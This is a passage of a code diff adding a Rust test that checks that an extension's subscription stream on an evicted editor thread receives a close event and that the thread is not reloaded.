+#[gpui::test]
+async fn hostile_an_extensions_evicted_editor_thread_still_closes_its_stream_and_is_not_reloaded(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let connection = loadable_connection();
+    let mut app = window(&fs, "/p/app", Some(connection.clone()), cx).await;
+    // A thread with a message: switching away never parks it as the empty draft.
+    crate::test_support::send_message(&app.panel, &mut app.cx);
+    // End the stub's turn, or the thread stays generating and retention never releases it.
+    let session = app
+        .thread()
+        .read_with(&app.cx, |thread, _| thread.session_id().clone());
+    connection.end_turn(
+        session,
+        agent_client_protocol::v1::schema::StopReason::EndTurn,
+    );
+    app.cx.run_until_parked();
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx);
+    let extension = open_session(1);
+    approve(&extension, &app.app_state(), cx);
+    extension.handle(
+        request(
+            "subscribe",
+            "s",
+            json!({ "target": { "thread_id": editor.to_key_string() } }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    assert_eq!(reply(&extension.drain(cx), "s")["kind"], "snapshot");
+
+    set_max_idle_retained_threads(0, cx);
+    open_another_editor_thread(&mut app);
+    set_max_idle_retained_threads(5, cx);
+
+    assert!(
+        kinds(&extension.drain(cx)).contains(&"thread_closed".to_string()),
+        "045 unchanged: an extension's stream on an evicted editor thread ends"
+    );
+    assert_eq!(
+        view_of(&app, editor),
+        None,
+        "the reload on eviction is for a panel's devtools thread only"
+    );
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/panel_policy_races.rs b/crates/agent_ui/src/browser_channel_tests/panel_policy_races.rs
